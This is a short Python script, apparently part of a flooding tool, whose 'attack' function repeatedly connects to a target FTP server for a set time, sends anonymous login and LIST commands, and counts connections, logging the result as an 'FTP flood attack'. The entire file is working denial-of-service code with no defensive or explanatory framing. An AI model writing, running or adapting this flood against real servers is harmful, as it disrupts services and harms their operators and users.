import socket
import time
import logging
import random

log = logging.getLogger(__name__)

def attack(target, port=21, duration=60, username="anonymous", password=""):
    start_time = time.time()
    end_time = start_time + duration
    connections_made = 0

    try:
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target, port))

                # Kirim perintah FTP
                s.send(f"USER {username}\r\n".encode())
                s.recv(1024)
                s.send(f"PASS {password}\r\n".encode())
                s.recv(1024)
                s.send(b"LIST\r\n")
                s.recv(1024)

                connections_made += 1
                s.close()
            except socket.error as e:
                log.debug(f"Socket error: {e}")
            except Exception as e:
                log.exception(f"An unexpected error occurred: {e}")
                break

    except KeyboardInterrupt:
        pass
    finally:
        log.info(f"FTP flood attack finished. {connections_made} connections attempted.")